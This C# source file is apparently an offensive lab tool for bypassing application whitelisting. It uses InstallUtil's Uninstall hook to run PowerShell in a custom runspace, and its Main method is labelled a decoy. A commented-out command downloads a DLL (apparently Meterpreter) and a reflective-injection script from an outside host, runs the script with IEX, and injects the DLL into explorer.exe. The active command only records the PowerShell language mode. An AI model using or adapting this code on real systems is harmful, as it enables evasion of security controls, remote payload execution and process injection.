using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }

        [System.ComponentModel.RunInstaller(true)]
        public class Sample : System.Configuration.Install.Installer
        {
            public override void Uninstall(System.Collections.IDictionary savedState)
            {
                String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
                // String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.0.0/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.0.0/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";

                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();

                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                ps.AddScript(cmd);

                ps.Invoke();

                rs.Close();
            }
        }
    }
}
